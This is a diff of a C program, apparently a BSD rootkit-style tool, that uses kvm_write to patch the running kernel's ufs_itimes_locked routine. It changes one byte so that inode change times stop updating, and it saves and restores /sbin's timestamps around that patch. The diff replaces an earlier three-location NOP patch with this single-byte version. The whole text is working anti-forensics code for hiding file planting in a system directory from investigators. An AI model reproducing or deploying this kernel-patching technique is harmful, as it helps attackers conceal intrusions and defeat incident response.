@@ -14,15 +14,12 @@
 #define DESTINATION	"/sbin/."
 
 /* Replacement Code */
-unsigned char nop4[] =
-	"\x90\x90\x90\x90";	/* 4x nop */
-
-unsigned char nop3[] = 
-	"\x90\x90\x90";		/* 3x nop */
+unsigned char dummy[] = 
+	"\x00";		/* Dummy Flag */
 
 int main (int argc, char *argv[])
 {
-	int i, offset1, offset2, offset3, count1, count2, count3;
+	int i, offset;
 	char errbuf[_POSIX2_LINE_MAX];
 	kvm_t *kd;
 	struct nlist nl[] = { {NULL}, {NULL}, };
@@ -60,42 +57,19 @@ int main (int argc, char *argv[])
 		exit(-1);
 	}
 
-	/* Search through ufs_itimes for the following three lines:
-	 * DIP_SET(ip, i_ctime, ts.tv_sec);
-	 * DIP_SET(ip, i_ctimensec, ts.tv_nsec);
-	 * DIP_SET(ip, i_modrev, DIP(ip, i_modrev) + 1);
-	 *
-	 * However, the bytes \x49\x8b\x4e\x38 appear 11 times
-	 * before the instruction we want to nop. Similarly,
-	 * \x49\x8b\x46\x38 appears 1 time before the one we want.
-	 * Therefore, we have to keep looking until we find the 
-	 * right one. */
-	count1 = 0;	// Out of 11
-	count3 = 0;	// Out of 1
+	/* Search through ufs_itimes_locked for the instruction:
+	 * test $0x2,%cl
+	 * This instruction checks the inode flag for IN_CHANGE = 0x2
+	 * as defined in <ufs/ufs/inode.h>. We are only going to change
+	 * the final byte (0x02) so that the entire IF statement is skipped. */
 	for ( i = 0 ; i < SIZE - 2 ; i++ )
 	{
-		if (	ufs_itimes_code[i] 	== 0x49 &&
-			ufs_itimes_code[i+1] 	== 0x8b &&
-			ufs_itimes_code[i+2] 	== 0x4e &&
-			ufs_itimes_code[i+3]	== 0x38)
-			if ( count1 == 11 )
-				offset1 = i;
-			else
-				count1++;
+		/* test $0x2,%cl */
+		if (	ufs_itimes_code[i] 	== 0xf6 &&
+			ufs_itimes_code[i+1] 	== 0xc1 &&
+			ufs_itimes_code[i+2] 	== 0x02)
+				offset = i+2;
 
-		if (	ufs_itimes_code[i]	== 0x89 &&
-			ufs_itimes_code[i+1]	== 0x41 &&
-			ufs_itimes_code[i+2]	== 0x48)
-			offset2 = i;
-
-		if (	ufs_itimes_code[i]	== 0x49 &&
-			ufs_itimes_code[i+1]	== 0x8b &&
-			ufs_itimes_code[i+2]	== 0x46 &&
-			ufs_itimes_code[i+3]	== 0x38)
-			if ( count3 == 1 )
-				offset3 = i;
-			else
-				count3++;
 	}
 
 	/* Save /sbin/'s access and modification times */
@@ -113,18 +87,8 @@ int main (int argc, char *argv[])
 	time[1].tv_sec 	= (time_t)sb.st_mtim.tv_sec;
 	time[1].tv_usec	= (long)sb.st_mtim.tv_nsec / 1000;
 
-	/* Patch ufs_itimes with nops */
-	if (kvm_write(kd, nl[0].n_value + offset1, nop4, sizeof(nop4)-1) < 0)
-	{
-		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
-		exit(-1);
-	}
-	if (kvm_write(kd, nl[0].n_value + offset2, nop3, sizeof(nop3)-1) < 0)
-	{
-		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
-		exit(-1);
-	}
-	if (kvm_write(kd, nl[0].n_value + offset3, nop4, sizeof(nop4)-1) < 0)
+	/* Patch ufs_itimes_locked with dummy byte */
+	if (kvm_write(kd, nl[0].n_value + offset, dummy, 1) < 0)
 	{
 		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
 		exit(-1);
@@ -141,18 +105,8 @@ int main (int argc, char *argv[])
 		exit(-1);
 	}
 
-	/* Restore ufs_itimes */
-	if (kvm_write(kd, nl[0].n_value + offset1, &ufs_itimes_code[offset1], sizeof(nop4)-1) < 0)
-	{
-		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
-		exit(-1);
-	}
-	if (kvm_write(kd, nl[0].n_value + offset2, &ufs_itimes_code[offset2], sizeof(nop3)-1) < 0)
-	{
-		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
-		exit(-1);
-	}
-	if (kvm_write(kd, nl[0].n_value + offset3, &ufs_itimes_code[offset3], sizeof(nop4)-1) < 0)
+	/* Restore ufs_itimes_locked */
+	if (kvm_write(kd, nl[0].n_value + offset, &ufs_itimes_code[offset], 1) < 0)
 	{
 		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
 		exit(-1);
